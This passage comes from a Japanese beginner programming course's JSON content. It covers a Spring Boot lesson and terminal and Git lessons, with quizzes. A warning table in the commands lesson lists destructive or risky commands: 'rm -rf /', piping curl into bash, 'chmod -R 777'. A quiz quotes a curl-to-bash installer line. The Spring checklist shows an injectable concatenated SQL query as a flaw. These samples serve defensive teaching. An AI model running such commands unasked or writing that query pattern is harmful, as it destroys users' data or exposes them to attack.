     ],
     "summary": "Java の Web アプリで最もよく使われる Spring Boot。@RestController・@GetMapping・@PathVariable・@RequestBody・@Valid、サービスとリポジトリの層、依存性注入、JPA のエンティティ、例外を 404 にする仕組み。FastAPI と並べて読む。",
     "body": "## このレッスンのゴール\n\n- `@RestController`・`@GetMapping` などのアノテーションが何をしているか説明できる\n- コントローラー・サービス・リポジトリの役割の違いが分かる\n- Spring Boot の API を、FastAPI のコードと対応させて読める\n\nこのレッスンのコードは、Spring Boot の書き方の説明のための抜粋です（Spring Boot のアプリをここでは動かしていません）。書き方は Spring Boot 3 の形です。\n\n## アノテーション：@ で始まる印\n\nSpring Boot のコードは、`@` で始まる **アノテーション** だらけです。\n\n```java\n@RestController\n@RequestMapping(\"/tasks\")\npublic class TaskController { ... }\n```\n\nアノテーションは、クラスやメソッドに付ける **「印」** です。それ自体は何もしませんが、Spring がアプリの起動時に印を探して、**「この印があるクラスは Web の窓口として登録しよう」** のように動きます。\n\nPython のデコレーター（`@app.get(\"/tasks\")`。Python コースのレッスン 13）と見た目も役割もよく似ています。\n\n## 全体のつながり\n\n```text\nリクエスト → TaskController（窓口）→ TaskService（業務の処理）→ TaskRepository（データベース）\n                    ↑ JSON にして返す        ↑ ルール・チェック         ↑ SQL は自動\n```\n\nバックエンドコースのレッスン 16 の「層に分ける」を、Spring は **決まった形** でやります。\n\n## エンティティ：テーブルの形\n\n```java\n@Entity\n@Table(name = \"tasks\")\npublic class Task {\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n\n    @Column(nullable = false, length = 200)\n    private String title;\n\n    private boolean done;\n\n    @ManyToOne(fetch = FetchType.LAZY)\n    private User owner;\n\n    // getter・setter は省略\n}\n```\n\n| アノテーション | 意味 | SQLAlchemy で言うと |\n|---|---|---|\n| `@Entity` / `@Table(name = \"tasks\")` | このクラスは tasks テーブル | `__tablename__ = \"tasks\"` |\n| `@Id` ＋ `@GeneratedValue(...)` | 主キー・自動の連番 | `mapped_column(primary_key=True)` |\n| `@Column(nullable = false, length = 200)` | NOT NULL・200 文字まで | `mapped_column(String(200), nullable=False)` |\n| `@ManyToOne(fetch = FetchType.LAZY)` | 多対 1（タスクの持ち主）。LAZY は使うときに読み込む | `relationship()`（遅延読み込み） |\n\nこれは **JPA**（Java のデータベースの ORM の決まり。中身は Hibernate）です。データベース設計のコースのレッスン 6 の「ORM の関係」と「N+1」が、そのまま当てはまります。\n\n## リポジトリ：SQL を書かない\n\n```java\npublic interface TaskRepository extends JpaRepository<Task, Long> {\n    List<Task> findByOwnerIdOrderByIdDesc(Long ownerId);\n    Optional<Task> findByIdAndOwnerId(Long id, Long ownerId);\n}\n```\n\n**インターフェースを書くだけで、中身は Spring が自動で作ります**。\n\n| メソッド | Spring が作る SQL（だいたい） |\n|---|---|\n| `findAll()`・`findById(id)`・`save(t)`・`deleteById(id)` | 最初から用意されている CRUD |\n| `findByOwnerIdOrderByIdDesc(ownerId)` | `SELECT ... WHERE owner_id = ? ORDER BY id DESC` |\n| `findByIdAndOwnerId(id, ownerId)` | `SELECT ... WHERE id = ? AND owner_id = ?` |\n\n**メソッドの名前から SQL を組み立てる** という、Spring Data の仕組みです。名前を読めば、どんな SQL か分かります。値はプレースホルダで渡されるので、SQL インジェクションの心配はありません（`@Query` で自分で SQL を書く場合は、`:name` のパラメータを使っているか確認）。\n\n## サービス：業務の処理\n\n```java\n@Service\npublic class TaskService {\n    private final TaskRepository repository;\n\n    public TaskService(TaskRepository repository) {\n        this.repository = repository;\n    }\n\n    public Task get(Long id, Long userId) {\n        return repository.findByIdAndOwnerId(id, userId)\n            .orElseThrow(() -> new TaskNotFoundException(id));\n    }\n\n    @Transactional\n    public Task create(String title, User owner) {\n        Task t = new Task();\n        t.setTitle(title);\n        t.setOwner(owner);\n        return repository.save(t);\n    }\n}\n```\n\n| 部分 | 意味 |\n|---|---|\n| `@Service` | 業務の処理をする部品として登録 |\n| コンストラクタで `TaskRepository` を受け取る | **依存性注入**：必要な部品を Spring が自動で渡してくれる（FastAPI の `Depends`） |\n| `findByIdAndOwnerId(...)` | ✅ **持ち主の確認**（IDOR を防ぐ。バックエンドコースのレッスン 9） |\n| `.orElseThrow(() -> new TaskNotFoundException(id))` | 無ければ例外（レッスン 4 の Optional） |\n| `@Transactional` | このメソッドの中の処理を **トランザクション** にする（データベース設計のコースのレッスン 5） |\n\n## コントローラー：Web の窓口\n\n```java\n@RestController\n@RequestMapping(\"/tasks\")\npublic class TaskController {\n    private final TaskService service;\n\n    public TaskController(TaskService service) {\n        this.service = service;\n    }\n\n    public record CreateTaskRequest(@NotBlank @Size(max = 200) String title) {}\n\n    @GetMapping(\"/{id}\")\n    public Task get(@PathVariable Long id, @AuthenticationPrincipal User user) {\n        return service.get(id, user.getId());\n    }\n\n    @PostMapping\n    @ResponseStatus(HttpStatus.CREATED)\n    public Task create(@Valid @RequestBody CreateTaskRequest req, @AuthenticationPrincipal User user) {\n        return service.create(req.title(), user);\n    }\n}\n```\n\nFastAPI で書くと、こうなります。\n\n```python\nclass CreateTaskRequest(BaseModel):\n    title: str = Field(min_length=1, max_length=200)\n\n@app.get(\"/tasks/{id}\")\ndef get(id: int, user: User = Depends(current_user)):\n    return service.get(id, user.id)\n\n@app.post(\"/tasks\", status_code=201)\ndef create(req: CreateTaskRequest, user: User = Depends(current_user)):\n    return service.create(req.title, user)\n```\n\n| Spring | FastAPI | 意味 |\n|---|---|---|\n| `@RestController` | （`app = FastAPI()`） | 返した値を JSON にする窓口 |\n| `@RequestMapping(\"/tasks\")` ＋ `@GetMapping(\"/{id}\")` | `@app.get(\"/tasks/{id}\")` | ルーティング |\n| `@PathVariable Long id` | `id: int` | パスの値 |\n| `@RequestBody CreateTaskRequest req` | `req: CreateTaskRequest` | 本文の JSON |\n| `@Valid` ＋ `@NotBlank @Size(max = 200)` | Pydantic の `Field(...)` | **バリデーション**。失敗したら自動で 400 |\n| `@AuthenticationPrincipal User user` | `Depends(current_user)` | ログイン中のユーザー |\n| `@ResponseStatus(HttpStatus.CREATED)` | `status_code=201` | 成功したときのステータス |\n\n**入力用の record（`CreateTaskRequest`）を、エンティティ（`Task`）とは別に作っている** のがポイントです。`@RequestBody Task task` とエンティティで直接受け取ると、`owner` や `id` まで外から書き込める **マスアサインメント** になります（セキュリティのコースのレッスン 5）。\n\n## 例外を 404 にする\n\n```java\n@ResponseStatus(HttpStatus.NOT_FOUND)\npublic class TaskNotFoundException extends RuntimeException {\n    public TaskNotFoundException(Long id) { super(\"タスクが見つかりません: \" + id); }\n}\n```\n\n例外のクラスに `@ResponseStatus(HttpStatus.NOT_FOUND)` を付けておくと、それが投げられたときに **Spring が 404 の返事にしてくれます**。まとめて変換したいときは `@RestControllerAdvice` ＋ `@ExceptionHandler` を使います。FastAPI の `raise HTTPException(404)` や `@app.exception_handler(...)` に当たります。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `@RequestBody Task task`（エンティティで直接受け取る） | ⚠️ マスアサインメント。入力用の DTO・record に |\n| `repository.findById(id)` だけで、持ち主を確かめていない | ⚠️ IDOR |\n| `@Query(\"SELECT ... WHERE name = '\" + name + \"'\")` / `createNativeQuery(\"...\" + x)` | ⚠️ SQL インジェクション。`:name` のパラメータに |\n| エンティティをそのまま JSON で返している（`password` 列がある） | ⚠️ パスワードのハッシュまで返る。返す用の DTO を作るか `@JsonIgnore` |\n| ループの中で `task.getOwner().getName()`（LAZY） | ⚠️ N+1（データベース設計のコースのレッスン 6）。`JOIN FETCH` や `@EntityGraph` |\n| `application.properties` / `application.yml` に `spring.datasource.password=...` | ⚠️ 秘密は環境変数から（`${DB_PASSWORD}`） |\n| `@Autowired` をフィールドに付けている | 古い書き方。コンストラクタで受け取る形が今の推奨 |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`@GetMapping(\"/{id}\") public Task get(@PathVariable Long id)` を FastAPI で書くと？",
        "choices": [
         "`@app.get(\"/{id}\")` の関数の引数 `id: int`",
         "`@app.post(\"/{id}\")`",
         "`request.json()[\"id\"]`"
        ],
        "answer": 0,
        "explain": "`@GetMapping` は GET のルーティング、`@PathVariable` は URL のパスの値です。"
       },
       {
        "question": "`interface TaskRepository extends JpaRepository<Task, Long> { Optional<Task> findByIdAndOwnerId(Long id, Long ownerId); }` の中身の SQL は？",
        "choices": [
         "自分で書く必要がある",
         "メソッド名から Spring が `WHERE id = ? AND owner_id = ?` のような SQL を自動で作る",
         "全件を読んでから Java で絞り込む"
        ],
        "answer": 1,
        "explain": "Spring Data は、メソッド名を読んで SQL を組み立てます。値はプレースホルダで渡されます。"
       },
       {
        "question": "コントローラーで `@RequestBody Task task`（エンティティ）を直接受け取るのが危ない理由は？",
        "choices": [
         "処理が遅くなるから",
         "id や owner など、利用者に変えさせたくない項目まで外から書き込めてしまうから",
         "JSON を受け取れないから"
        ],
        "answer": 1,
        "explain": "入力用の record や DTO を作り、受け取る項目を決めておくのが、マスアサインメントの対策です。"
       }
      ]
     ],
     "id": "06-spring-boot"
    }
   ],
   "status": "open"
  },
  {
   "title": "C 言語",
   "icon": "🔧",
   "order": 92,
   "category": "language",
   "status": "planned",
   "description": "多くの言語の祖先。マイコンや OS など、機械に近い所で使われる。",
   "outline": [
    "main 関数と printf",
    "型とメモリ",
    "ポインタ",
    "配列と文字列",
    "malloc と free"
   ],
   "id": "92-c",
   "lessons": []
  },
  {
   "title": "C++",
   "icon": "⚙️",
   "order": 93,
   "category": "language",
   "status": "planned",
   "description": "C を拡張した言語。ゲーム（Unreal Engine）や高速な処理で使われる。",
   "outline": [
    "C との違い",
    "クラスと参照",
    "STL（vector・map）",
    "スマートポインタ",
    "テンプレート"
   ],
   "id": "93-cpp",
   "lessons": []
  },
  {
   "title": "C#",
   "icon": "🟪",
   "order": 94,
   "category": "language",
   "status": "planned",
   "description": "Unity のゲーム開発や Windows アプリで使われる言語。",
   "outline": [
    "クラスと名前空間",
    "プロパティ",
    "LINQ",
    "async/await",
    "Unity のスクリプトを読む"
   ],
   "id": "94-csharp",
   "lessons": []
  },
  {
   "title": "Kotlin",
   "icon": "🟣",
   "order": 95,
   "category": "language",
   "status": "planned",
   "description": "Android アプリ開発の標準言語。Java を簡潔にしたような書き方。",
   "outline": [
    "val と var",
    "null 安全",
    "data class",
    "ラムダとコレクション操作",
    "Jetpack Compose を読む"
   ],
   "id": "95-kotlin",
   "lessons": []
  },
  {
   "title": "Swift",
   "icon": "🕊️",
   "order": 96,
   "category": "language",
   "status": "planned",
   "description": "iPhone・Mac アプリの言語。",
   "outline": [
    "let と var",
    "オプショナル",
    "struct と class",
    "クロージャ",
    "SwiftUI を読む"
   ],
   "id": "96-swift",
   "lessons": []
  },
  {
   "title": "Ruby",
   "icon": "💎",
   "order": 97,
   "category": "language",
   "status": "planned",
   "description": "日本生まれの言語。Ruby on Rails の Web アプリで使われる。",
   "outline": [
    "変数とメソッド",
    "ブロックと each",
    "シンボルとハッシュ",
    "クラス",
    "Rails のコードを読む"
   ],
   "id": "97-ruby",
   "lessons": []
  },
  {
   "title": "ターミナルと Git をくわしく",
   "icon": "⌨️",
   "order": 120,
   "category": "topic",
   "description": "黒い画面（ターミナル）の歩き方と、Git を毎日・チームで使うための知識。パス、よく使うコマンド、履歴の読み方、ブランチ、コンフリクト、プルリクエスト、取り消し方まで。Windows（PowerShell・Git Bash）の違いも。",
   "levels": {
    "1": "入門：ターミナルに慣れる",
    "2": "基礎：Git の毎日",
    "3": "実践：チームで使う",
    "4": "応用：困ったときに"
   },
   "id": "120-terminal-git",
   "lessons": [
    {
     "title": "ディレクトリとパス ― 今どこにいる？",
     "level": 1,
     "minutes": 14,
     "concepts": [
      "tooling",
      "io"
     ],
     "summary": "ターミナルの「現在地」と、ファイルの場所を表すパス。絶対パス・相対パス・`.` と `..`・`~`、Windows と Mac/Linux の書き方の違い。",
     "body": "## このレッスンのゴール\n\n- 「カレントディレクトリ（現在地）」の意味を説明できる\n- 絶対パスと相対パスを読み分けられ、`.`・`..`・`~` の意味が分かる\n- Windows の `C:\\Users\\...` と、Git Bash の `/c/Users/...` が同じ場所だと分かる\n\n## ターミナルとは\n\n**ターミナル**（黒い画面）は、マウスの代わりに **文字でコンピュータに命令する** 画面です。AI が「これを実行して」と出してくるコマンドは、ここに打ち込みます。\n\n| Windows でよく使うもの | 特徴 |\n|---|---|\n| **PowerShell** | Windows の標準。`C:\\Users\\ryo>` のように表示される |\n| **Git Bash** | Git と一緒に入る。Mac・Linux と同じコマンド（Bash）が使える |\n| VS Code のターミナル | 中で PowerShell か Git Bash などを選んで使う |\n\nAI の説明や、ネットの記事のコマンドは **Mac・Linux 向け（Bash）が多い** です。Windows では Git Bash を使うと、そのまま動くことが多くなります。\n\n## フォルダ ＝ ディレクトリ\n\nターミナルの世界では、フォルダのことを **ディレクトリ** と呼びます。ディレクトリの中にディレクトリが入り、**木（ツリー）** のような形になっています。\n\n```text\nC:\\                           ← いちばん上（ルート）\n└── Users\n    └── ryo                   ← ホームディレクトリ（自分専用の場所）\n        ├── Desktop\n        ├── Documents\n        └── learn_programing  ← このサイトのリポジトリ\n            ├── content\n            │   └── courses\n            ├── site\n            │   └── index.html\n            └── tools\n                └── build.py\n```\n\n## 現在地：カレントディレクトリ\n\nターミナルは、いつも **どこかのディレクトリの中にいます**。これを **カレントディレクトリ**（作業ディレクトリ）と呼びます。\n\n```bash\npwd                    # 今どこにいるか（print working directory）\n# /c/Users/ryo/learn_programing\n```\n\nPowerShell では `pwd`、または画面の左の `PS C:\\Users\\ryo\\learn_programing>` を見れば分かります。\n\n`python tools/build.py` のようなコマンドは、**現在地から見た場所** を探します。違うディレクトリにいると、こうなります。\n\n```text\npython: can't open file 'C:\\\\Users\\\\ryo\\\\tools\\\\build.py': [Errno 2] No such file or directory\n```\n\n「`C:\\Users\\ryo` の中に `tools\\build.py` は無い」＝ **いる場所が違う** というエラーです。`cd learn_programing` で移動してから実行し直します。\n\n## 絶対パスと相対パス\n\n**パス** は、ファイルやディレクトリの場所を表す文字列です。\n\n| 種類 | 例 | 意味 |\n|---|---|---|\n| **絶対パス** | `C:\\Users\\ryo\\learn_programing\\site\\index.html` | ルートから全部たどった住所。どこにいても同じ場所を指す |\n| **相対パス** | `site\\index.html` | **現在地から** たどった道順。いる場所によって指す先が変わる |\n\n### 相対パスの記号\n\n| 記号 | 意味 | 例 |\n|---|---|---|\n| `.` | 今いるディレクトリ | `./build.py`（ここにある build.py） |\n| `..` | 1 つ上のディレクトリ | `../site`（1 つ上に戻ってから site へ） |\n| `~` | ホームディレクトリ | `~/Desktop`（= `C:\\Users\\ryo\\Desktop`） |\n\n```bash\ncd ~/learn_programing/tools    # ここに移動して\nls ..                          # 1 つ上（learn_programing）の中身\n# content  site  tools  ...\npython build.py                # tools の中なので、そのまま書ける\npython ../tools/build.py       # 上に戻ってから tools へ（同じファイル）\n```\n\n## Windows と Mac/Linux の書き方の違い\n\n| | Windows（PowerShell） | Mac・Linux・Git Bash |\n|---|---|---|\n| 区切り文字 | `\\`（バックスラッシュ。日本語キーボードでは `¥` に見える） | `/`（スラッシュ） |\n| ルート | `C:\\`（ドライブごと） | `/` |\n| ホーム | `C:\\Users\\ryo` | Mac：`/Users/ryo`、Linux：`/home/ryo` |\n| Git Bash での C ドライブ | — | `/c/Users/ryo` |\n| 大文字・小文字 | 区別しない（`README.md` と `readme.md` は同じ） | 区別する（Mac は初期設定では区別しない） |\n\n⚠️ 大文字・小文字の違いは、Windows で動いたのにサーバー（Linux）で `No such file` になる、という形でよく問題になります。`import` するファイル名は、大文字・小文字まで正確に書きましょう。\n\n### Python のコードではどう書く？\n\n```python\nfrom pathlib import Path\n\nbase = Path(__file__).parent          # このファイルがあるディレクトリ\ndata = base / \"data\" / \"items.json\"   # / でつなげば、OS に合った区切りになる\nprint(data.resolve())                 # 絶対パスにする\n```\n\n`Path(__file__).parent` は「このプログラムのファイルがある場所」です。**どこから実行しても同じファイルを指せる** ので、AI のコードでよく見かけます。このサイトの `tools/build.py` も、この書き方で `content/` を探しています。\n\n## スペースを含むパス\n\n```bash\ncd my folder        # bash: cd: too many arguments  ← 「my」と「folder」の 2 つと思われた\ncd \"my folder\"      # ✅ 引用符でくくる\ncd my\\ folder       # ✅ Bash では \\ でスペースを「ただの文字」にできる\n```\n\nターミナルは **スペースで区切って** 命令を読むので、スペースを含むパスは `\"...\"` でくくります。`C:\\Program Files` などでよく出会います。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 意味 |\n|---|---|\n| `cd your-project` | 「自分のプロジェクトのディレクトリに移動して」。名前は自分の環境に合わせて読み替える |\n| `./venv/bin/activate`（Mac/Linux）／`.\\venv\\Scripts\\activate`（Windows） | 同じことを OS ごとに書いたもの |\n| `open(\"data.csv\")` | 相対パス。**実行したときの現在地** から探す。現在地が違うと見つからない |\n| `Path(__file__).parent / \"data.csv\"` | このファイルの隣を探す。どこから実行しても同じ |\n| `C:\\\\Users\\\\...` | Python の文字列の中の `\\` は 2 つ重ねる（または `r\"C:\\Users\\...\"`） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`python tools/build.py` を実行したら `No such file or directory` と出た。まず疑うことは？",
        "choices": [
         "今いるディレクトリ（カレントディレクトリ）が違う",
         "Python が壊れている",
         "build.py の中身が間違っている"
        ],
        "answer": 0,
        "explain": "相対パスは現在地から探します。`pwd` で現在地を確認し、リポジトリのディレクトリに `cd` してから実行します。"
       },
       {
        "question": "今 `learn_programing/tools` にいるとき、`../site/index.html` が指すのは？",
        "choices": [
         "`learn_programing/tools/site/index.html`",
         "`learn_programing/site/index.html`",
         "`site/index.html`（ルート直下）"
        ],
        "answer": 1,
        "explain": "`..` で 1 つ上（learn_programing）に戻ってから、site/index.html へ進みます。"
       },
       {
        "question": "Git Bash の `/c/Users/ryo/Desktop` と同じ場所は？",
        "choices": [
         "`/Users/ryo/Desktop`",
         "`C:\\Users\\ryo\\Desktop`",
         "`~/c/Desktop`"
        ],
        "answer": 1,
        "explain": "Git Bash では、C ドライブを `/c` と書きます。区切りの `/` と `\\` が違うだけで、同じ場所です。"
       }
      ]
     ],
     "id": "01-paths"
    },
    {
     "title": "よく使うコマンドと「危ないコマンド」",
     "level": 1,
     "minutes": 18,
     "concepts": [
      "tooling",
      "security"
     ],
     "summary": "ls・cd・mkdir・cp・mv・rm・cat・grep などの基本と、コマンドの読み方（オプション・引数）。PowerShell との違い、command not found と PATH、実行前に必ず止まるべきコマンド。",
     "body": "## このレッスンのゴール\n\n- コマンドを「命令・オプション・引数」に分けて読める\n- よく使うコマンドが何をするか分かり、PowerShell での書き方の違いを知っている\n- `command not found` の原因（PATH）と、実行前に確認すべき危ないコマンドが分かる\n\n## コマンドの形\n\n```bash\nls   -la   src\n│    │     └ 引数（何に対して）\n│    └ オプション（どんなふうに）。- 1 つは 1 文字、-- 2 つは長い名前（--all）\n└ 命令（何をする）\n```\n\nPython の関数で言うと、`ls(src, long=True, all=True)` のようなものです。\n\n困ったら `コマンド --help`（PowerShell では `Get-Help コマンド`）で説明が出ます。\n\n## 基本のコマンド\n\n### 見る・移動する\n\n| コマンド | 意味 | 例 |\n|---|---|---|\n| `pwd` | 今いる場所を表示 | |\n| `ls` | 中身の一覧 | `ls -la`（隠しファイルも、詳しく） |\n| `cd 場所` | 移動 | `cd src`、`cd ..`、`cd ~` |\n| `cat ファイル` | 中身を表示 | `cat README.md` |\n| `head` / `tail` | 先頭／末尾だけ表示 | `tail -n 20 app.log`（最後の 20 行） |\n\n```text\n$ ls -la\ntotal 12\ndrwxr-xr-x 3 ryo ryo 4096 Nov 21 17:36 .\ndrwxr-xr-x 3 ryo ryo 4096 Nov 21 17:36 ..\n-rw-r--r-- 1 ryo ryo    0 Nov 21 17:36 README.md\ndrwxr-xr-x 2 ryo ryo 4096 Nov 21 17:36 src\n```\n\n先頭の `d` はディレクトリ、`-` はファイル。`rwx` は読む・書く・実行するの権限（コンピュータの基礎コースのレッスン 2 の 8 進数 `755` の正体）です。\n\n### 作る・コピー・移動・削除\n\n| コマンド | 意味 | 例 |\n|---|---|---|\n| `mkdir` | ディレクトリを作る | `mkdir -p data/2026`（途中のディレクトリもまとめて） |\n| `touch` | 空のファイルを作る | `touch .env` |\n| `cp` | コピー | `cp .env.example .env`、`cp -r src backup`（ディレクトリごと） |\n| `mv` | 移動・名前の変更 | `mv old.py new.py` |\n| `rm` | 削除 | `rm memo.txt`、`rm -r build`（ディレクトリごと） |\n\n⚠️ ターミナルの `rm` は **ゴミ箱に入りません**。消したら基本的に戻せません。\n\n### 探す\n\n| コマンド | 意味 | 例 |\n|---|---|---|\n| `grep` | ファイルの中から文字列を探す | `grep -rn \"print\" src`（-r：中のディレクトリも、-n：行番号も） |\n| `find` | ファイルを名前などで探す | `find . -name \"*.py\"` |\n| `which` | コマンドの本体の場所 | `which python` |\n\n```text\n$ grep -rn \"print\" project\nproject/src/main.py:1:print('hi')\n```\n\n「`project/src/main.py` の 1 行目にある」と読みます。\n\n### つなぐ：パイプとリダイレクト\n\n| 記号 | 意味 | 例 |\n|---|---|---|\n| `\\|` | 左の出力を、右の入力に渡す | `cat app.log \\| grep ERROR`（エラーの行だけ） |\n| `>` | 出力をファイルに書く（**上書き**） | `pip freeze > requirements.txt` |\n| `>>` | 出力をファイルの末尾に追加 | `echo \".env\" >> .gitignore` |\n| `&&` | 左が成功したら右を実行 | `cd site && ls` |\n\n## PowerShell では\n\nWindows の PowerShell にも `ls`・`cd`・`pwd`・`cat`・`cp`・`mv`・`rm` という名前は用意されていますが、**中身は別の命令** なので、オプションが違います。\n\n| やりたいこと | Bash（Mac・Linux・Git Bash） | PowerShell |\n|---|---|---|\n| ディレクトリごと削除 | `rm -rf build` | `Remove-Item -Recurse -Force build` |\n| 文字列を探す | `grep -rn \"print\" src` | `Select-String -Path src\\*.py -Pattern \"print\"` |\n| 環境変数を設定 | `export API_KEY=xxx` | `$env:API_KEY = \"xxx\"` |\n| 空のファイル | `touch .env` | `New-Item .env` |\n| 続けて実行 | `cd site && ls` | PowerShell 7 なら同じ。Windows 標準の 5.1 では `cd site; ls` |\n\nAI が出したコマンドが PowerShell でエラーになったら、**「Bash 向けのコマンドでは？」** と疑い、Git Bash で実行するか、「PowerShell 用に書き直して」と頼みましょう。\nこのリポジトリの `open-site.bat` は、さらに古い **コマンドプロンプト**（cmd）向けの書き方（`rem`・`%~dp0` など）です。\n\n## `command not found` と PATH\n\n```text\nbash: nosuchcmd: command not found\n'python' は、内部コマンドまたは外部コマンド、操作可能なプログラムまたはバッチ ファイルとして認識されていません。\n```\n\nコマンドを打つと、ターミナルは **環境変数 `PATH` に書かれたディレクトリを順番に探して**、同じ名前のプログラムを見つけて実行します。見つからないと `command not found` です。\n\n```bash\nwhich python3        # /usr/local/bin/python3   ← 見つかった本体の場所\necho $PATH           # 探す場所の一覧（: 区切り。Windows は ; 区切り）\n```\n\n| 原因 | 対処 |\n|---|---|\n| そもそもインストールしていない | インストールする |\n| インストールしたが、ターミナルを開き直していない | ターミナルを閉じて開き直す（PATH は起動時に読まれる） |\n| インストール時に「PATH に追加」をしなかった | Python なら、インストーラーの「Add python.exe to PATH」にチェックを入れて入れ直す |\n| 名前が違う | Mac/Linux は `python3`、Windows は `python` や `py` のことが多い |\n\n## ⚠️ 実行前に必ず止まるべきコマンド\n\nAI が出したコマンドでも、次のものは **何が起きるかを理解してから** 実行します。\n\n| コマンド | 何が危ないか |\n|---|---|\n| `rm -rf 場所` | 確認なしでディレクトリごと消す。`rm -rf /`、`rm -rf ~`、`rm -rf $DIR/`（変数が空だと `/` になる）は特に致命的 |\n| `sudo ...` | 管理者の権限で実行する。システム全体を変えられる |\n| `curl ... \\| bash`／`irm ... \\| iex`（PowerShell） | ネットから取ってきたプログラムを、中身を見ずに実行する |\n| `chmod -R 777` | 誰でも読み書き・実行できるようにする |\n| `> 大事なファイル` | 中身を空にして上書きする |\n| `git reset --hard`・`git push --force` | 次のレッスン以降で説明（作業が消える・履歴を上書きする） |\n\n迷ったら「このコマンドは何を消す・変える可能性がある？」と AI に聞き返しましょう。\n\n## AI のコードではこう出てくる\n\n```bash\npython -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt\n```\n\n`&&` で 3 つをつないでいます。① `.venv` という場所に Python の作業用の環境を作る → ② それを有効にする → ③ 必要なライブラリを入れる。\nWindows の PowerShell では ② が `.venv\\Scripts\\Activate.ps1` になります。**同じことを OS ごとに書き分けている** だけなので、どの部分が何をしているかを分けて読めば怖くありません。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`cp -r src backup` の意味は？",
        "choices": [
         "backup を src に移動する",
         "src ディレクトリを中身ごと backup という名前でコピーする",
         "src を削除して backup を作る"
        ],
        "answer": 1,
        "explain": "`cp` はコピー、`-r` はディレクトリの中身ごと（recursive）。引数は「コピー元 コピー先」の順です。"
       },
       {
        "question": "Python をインストールしたのに `python: command not found` と出た。よくある原因は？",
        "choices": [
         "Python のコードに間違いがある",
         "ターミナルを開き直していない、または PATH に追加されていない",
         "パソコンのメモリが足りない"
        ],
        "answer": 1,
        "explain": "ターミナルは PATH に書かれた場所からコマンドを探します。インストール後にターミナルを開き直すか、PATH の設定を確認します。"
       },
       {
        "question": "AI が `curl -fsSL https://example.com/install.sh | bash` を出してきた。どう考える？",
        "choices": [
         "公式っぽい URL なら何も考えずに実行してよい",
         "ネットのプログラムを中身を見ずに実行するので、配布元が信頼できるかを確認してから実行する",
         "`curl` はファイルを表示するだけなので安全"
        ],
        "answer": 1,
        "explain": "`| bash` は、ダウンロードしたものをそのまま実行します。公式のインストール方法でもよく使われますが、URL が本当に公式のものかを確かめてから実行します。"
       }
      ]
     ],
     "id": "02-commands"
    },
    {
     "title": "コミットと履歴を読む ― status・diff・log",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "version_control",
      "tooling",
      "reading"
     ],
     "summary": "Git の 3 つの場所（作業中・ステージ・コミット済み）と、git status・diff・log・show・blame の出力の読み方。.gitignore で秘密を守る。",
     "body": "## このレッスンのゴール\n\n- 「作業中」「ステージ」「コミット済み」の 3 つの場所を説明できる\n- `git status`・`git diff`・`git log` の出力を読める\n- `.gitignore` の役割が分かり、`.env` がコミットされそうになっていたら気づける\n\nAI と開発するコースの「Git の基本」の続きです。ここでは、実際に買い物メモのリポジトリを作って試した出力を読みます。\n\n## 3 つの場所\n\n```text\n 作業ディレクトリ        ステージ（インデックス）       リポジトリ（履歴）\n ファイルを編集する場所  →  次のコミットに入れる候補  →  コミット済みの記録\n              git add            git commit\n```\n\n| 場所 | たとえ | 確認するコマンド |\n|---|---|---|\n| 作業ディレクトリ | 机の上の下書き | `git diff` |\n| ステージ | 「これを提出する」と箱に入れたもの | `git diff --staged` |\n| リポジトリ | 提出済みの記録 | `git log` |\n\nステージがあるおかげで、**変更したファイルのうち、一部だけをコミットする** ことができます。\n\n## git status：今どうなっている？\n\n```text\n$ git status --short\n M shopping.md\n?? .env\n?? app.py\n```\n\n| 記号 | 意味 |\n|---|---|\n| `??` | Git がまだ管理していない新しいファイル（untracked） |\n| ` M`（左が空白） | 変更したが、まだステージに入れていない |\n| `M `（右が空白） | 変更をステージに入れた |\n| `A ` | 新しいファイルをステージに入れた |\n| `D ` | 削除した |\n\n`--short` を付けない `git status` は、次に何をすればよいかを英語で教えてくれます（`use \"git add <file>...\" to include in what will be committed` ＝「コミットに入れるなら git add して」）。\n\n## git diff：何を変えた？\n\n```diff\n$ git diff\ndiff --git a/shopping.md b/shopping.md\nindex 2ec13e6..44b0a40 100644\n--- a/shopping.md\n+++ b/shopping.md\n@@ -2,3 +2,4 @@\n\n - りんご\n - 牛乳\n+- パン\n```\n\n| 部分 | 読み方 |\n|---|---|\n| `--- a/...` / `+++ b/...` | 変更前（a）と変更後（b） |\n| `@@ -2,3 +2,4 @@` | 変更前の 2 行目から 3 行分が、変更後は 2 行目から 4 行分になった |\n| 先頭が空白の行 | 変わっていない前後の行（場所の目印） |\n| `+` の行 | 追加された行 |\n| `-` の行 | 削除された行 |\n\n1 行を書き換えた場合は、`-` の古い行と `+` の新しい行が並びます。AI と開発するコースの「差分を読む」で練習したのと同じ形です。\n\n| コマンド | 見えるもの |\n|---|---|\n| `git diff` | 作業中で、まだステージに入れていない変更 |\n| `git diff --staged` | ステージに入れた変更（次のコミットの中身） |\n| `git diff main` | 今のブランチと main の違い |\n| `git diff --stat` | ファイルごとの変更行数だけ |\n\n## git log：これまでの記録\n\n```text\n$ git log --oneline\nd978c53 Add app\n3509968 Add bread\nf60a6eb Add shopping list\n```\n\n上が新しい順です。左の `d978c53` は **コミット ID**（長い 16 進数の先頭 7 文字）で、コミットを指す名前として使えます。\n\n```text\n$ git show --stat 3509968\ncommit 35099684f118846508ae5c49d30a2ec29f6d8a7f\nAuthor: Ryo <ryo@example.com>\nDate:   Sat Nov 21 17:36:18 2026 +0000\n\n    Add bread\n\n shopping.md | 1 +\n 1 file changed, 1 insertion(+)\n```\n\n| よく使う形 | 意味 |\n|---|---|\n| `git log --oneline --graph` | ブランチの分かれ方も図で見る（次のレッスン） |\n| `git log -p ファイル` | そのファイルの変更の中身ごと |\n| `git show ID` | 1 つのコミットの中身 |\n| `HEAD` | 今いるコミット。`HEAD~1` は 1 つ前 |\n\n### git blame：この行は誰がいつ書いた？\n\n```text\n$ git blame -L 3,5 shopping.md\n^f60a6eb (Ryo 2026-11-21 17:36:18 +0000 3) - りんご\nd5398514 (Ryo 2026-11-21 17:36:26 +0000 4) - バナナ\n077e9717 (Ryo 2026-11-21 